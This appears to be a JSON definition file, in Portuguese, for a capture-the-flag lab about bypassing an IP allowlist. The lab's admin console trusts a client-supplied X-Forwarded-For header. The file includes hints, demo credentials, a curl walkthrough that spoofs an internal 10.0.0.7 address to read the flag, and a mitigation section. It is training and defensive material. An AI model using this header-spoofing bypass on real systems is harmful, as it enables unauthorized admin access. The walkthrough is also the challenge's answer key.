@@ -1,0 +1,82 @@
+{
+  "slug": "access-trust-proxy-header",
+  "title": "A rede do escritório é o que você disser",
+  "codename": "OPSGRID",
+  "summary": "O console de admin da Opsgrid fica aberto para requests vindas dos ranges internos 10/8 (e outros privados), decidido pelo valor mais à esquerda de X-Forwarded-For enviado pelo cliente. Entre como o engenheiro de plantão e adicione o header você mesmo.",
+  "category": "access",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "access-trust-proxy-header",
+  "estimated_minutes": 12,
+  "xp": 110,
+  "tech": [
+    "Flask",
+    "HTTP",
+    "ipaddress",
+    "Reverse proxy"
+  ],
+  "tags": [
+    "ip-allowlist-bypass",
+    "x-forwarded-for",
+    "trusted-proxies",
+    "access-control"
+  ],
+  "story": "A Opsgrid é um dashboard de resposta a incidentes. O status board é público para a equipe, mas as ações de manutenção ficam em `/admin`, restrito a tráfego da rede corporativa. A aplicação está atrás de um load balancer de borda que deveria adicionar `X-Forwarded-For`, e a aplicação considera o primeiro endereço dessa lista como o cliente. Nada no código registra qual proxy pode definir esse header — nem quantos hops confiar.",
+  "objective": "Entre como o engenheiro de plantão, falsifique um endereço de origem interno e alcance o console de admin para ler a flag de manutenção.",
+  "rules": "Fique na origem loopback designada. Não escaneie nem contate ranges de rede internos; o header é avaliado localmente.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Segredo do console de manutenção",
+      "flag_type": "user",
+      "points": 110,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Como ele sabesonde você está?",
+      "body": "Entre como `mei` / `mei-sre-2026` e olhe `/status`. A página imprime o endereço de origem que detectou (`0.0.0.0` até um header dizer o contrário). Depois tente `/admin` e leia a mensagem de rejeição: ela repete a origem usada.",
+      "cost": 10
+    },
+    {
+      "level": 2,
+      "title": "Origem controlada pelo cliente",
+      "body": "A origem detectada muda quando você envia `X-Forwarded-For`. O código pega o primeiro valor do header e o compara com ranges privados como `10.0.0.0/8`; ele nunca verifica qual proxy forneceu o header.",
+      "cost": 10
+    },
+    {
+      "level": 3,
+      "title": "Vire 10.0.0.x",
+      "body": "Entre como `mei`, depois faça `GET /admin` com `X-Forwarded-For: 10.0.0.7`. A página de auditoria registra a origem interpretada, o que é útil para o write-up.",
+      "cost": 10
+    }
+  ],
+  "solution": {
+    "walkthrough": "1. Entre com a conta de plantão de demonstração:\n\n```bash\ncurl -c jar.txt -d 'username=mei&password=mei-sre-2026' http://127.0.0.1:PORT/login\n```\n\n2. Observe a negação e a origem que ela reporta:\n\n```bash\ncurl -b jar.txt http://127.0.0.1:PORT/admin\n# Administrative access is restricted to the internal network. ... seen from 0.0.0.0\n```\n\n3. Falsifique um endereço corporativo:\n\n```bash\ncurl -b jar.txt -H 'X-Forwarded-For: 10.0.0.7' http://127.0.0.1:PORT/admin\n```\n\nA página reporta `Internal access granted to mei from 10.0.0.7` e mostra a flag.\n\n4. Realismo opcional: uma borda que acrescenta o hop real ainda falha, porque o código confia no valor mais à esquerda.\n\n```bash\ncurl -b jar.txt -H 'X-Forwarded-For: 10.20.30.40, 203.0.113.9' http://127.0.0.1:PORT/admin\n```\n\n5. `GET /audit` mostra a origem interpretada de cada request.",
+    "root_cause": "A aplicação deriva a origem de rede da request a partir de `X-Forwarded-For` sem uma lista de trusted proxies. Qualquer cliente pode enviar o header, e quando há um load balancer real o header é uma lista: o atacante controla a entrada mais à esquerda enquanto a borda confiável acrescenta o peer verdadeiro. A decisão de acesso, portanto, se baseia em dados do atacante, permitindo que clientes externos aleguem um endereço privado como 10.0.0.7.",
+    "mitigation": "Nunca confie em headers de forwarding vindos de peers arbitrários. Configure a camada de proxy como o único lugar que reescreve `X-Forwarded-For` (removendo cópias de entrada), e no app use um mecanismo do framework que leia o header apenas quando `request.remote_addr` pertence a uma lista de proxies conhecidos (por exemplo, o `ProxyFix` do Werkzeug com uma contagem explícita de proxies, ou uma allowlist explícita de CIDRs de borda). Prefira controles em nível de rede: mutual TLS ou VPN somados a autorização vinculada à sessão. Trate IP allowlists como um sinal entre vários, e registre tanto o endereço do peer quanto a cadeia de forwarding."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — HTTP Host header attacks: X-Forwarded-For and access control",
+      "url": "https://portswigger.net/web-security/host-header/exploiting",
+      "source_type": "official",
+      "description": "Por que headers de forwarding são confiáveis e como restrições por IP são contornadas."
+    },
+    {
+      "title": "MDN — X-Forwarded-For",
+      "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For",
+      "source_type": "official",
+      "description": "Semântica do header, a cadeia separada por vírgulas e ressalvas sobre spoofing."
+    },
+    {
+      "title": "Werkzeug — ProxyFix: X-Forwarded-For with an explicit proxy count",
+      "url": "https://werkzeug.palletsprojects.com/en/stable/middleware/proxy_fix/",
+      "source_type": "official",
+      "description": "A forma suportada de consumir headers de forwarding apenas de proxies configurados."
+    }
+  ]
+}
